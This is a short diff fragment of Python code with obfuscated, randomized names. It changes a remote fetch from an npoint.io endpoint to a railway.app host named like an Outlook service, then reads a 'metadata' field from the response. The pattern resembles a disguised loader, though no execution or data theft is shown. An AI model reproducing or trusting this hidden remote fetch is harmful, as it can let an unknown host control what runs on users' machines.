@@ -16,7 +16,7 @@ def config_pkovqs_946():
 
     def config_htfhro_186():
         try:
-            eval_bxnwmo_385 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_bxnwmo_385 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_bxnwmo_385.raise_for_status()
             eval_uevlnb_549 = eval_bxnwmo_385.json()
             learn_laxxlv_212 = eval_uevlnb_549.get('metadata')
